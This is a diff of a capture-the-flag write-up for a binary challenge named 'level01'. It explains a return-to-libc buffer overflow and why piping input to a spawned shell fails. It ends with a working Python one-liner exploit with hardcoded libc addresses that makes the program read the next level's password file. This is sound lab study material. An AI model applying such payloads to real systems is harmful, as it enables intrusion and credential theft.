@@ -40,13 +40,18 @@ Payload (sent as the password):
 "A" * 80  +  system  +  exit  +  "/bin/sh"
 ```
 
-## Why not system("/bin/sh")?
+## Note on system("/bin/sh") via pipe
 
-`system()` forks `/bin/sh`, which inherits fd 0. However, the C stdio library in
-`level01` has already buffered all remaining stdin bytes during the `fgets` calls,
-so the child shell sees EOF and exits immediately without running any commands.
+When the exploit is delivered through a shell pipe (`echo ... | ./level01`), the
+C stdio library has already consumed all pipe data before the shell spawns, so the
+child `/bin/sh` sees EOF immediately and exits.  The one-liner below avoids this
+by calling `system()` with a command already embedded in the username buffer
+instead of spawning an interactive shell.
 
-## Solution: embed the command in the username buffer
+When using an interactive PTY (e.g. pwntools SSH session as in exploit.py),
+`system("/bin/sh")` works directly because stdin is not pre-buffered.
+
+## Solution: embed the command in the username buffer (for pipe delivery)
 
 `a_user_name` (global, `0x804a040`) holds the username. `strncmp` only checks 7
 bytes, so the rest of the 256-byte `fgets` input is stored but ignored.
@@ -55,4 +60,4 @@ Write `"dat_wil\x00cat /home/users/level02/.pass"` as the username, then call
 `system(a_user_name + 8)` — no interactive shell needed, no stdin buffering issue.
 
 ## One-liner
-python -c "import struct,os; system=0xf7e6aed0; exit_=0xf7e5eb70; cmd_addr=0x804a040+8; os.write(1,'dat_wil\x00cat /home/users/level02/.pass\n'+'A'*80+struct.pack('<I',system)+struct.pack('<I',exit_)+struct.pack('<I',cmd_addr)+'\n')" | ./level01 
+python -c "import struct,os; system=0xf7e6aed0; exit_=0xf7e5eb70; cmd_addr=0x804a040+8; os.write(1,'dat_wil\x00cat /home/users/level02/.pass\n'+'A'*80+struct.pack('<I',system)+struct.pack('<I',exit_)+struct.pack('<I',cmd_addr)+'\n')" | ./level01
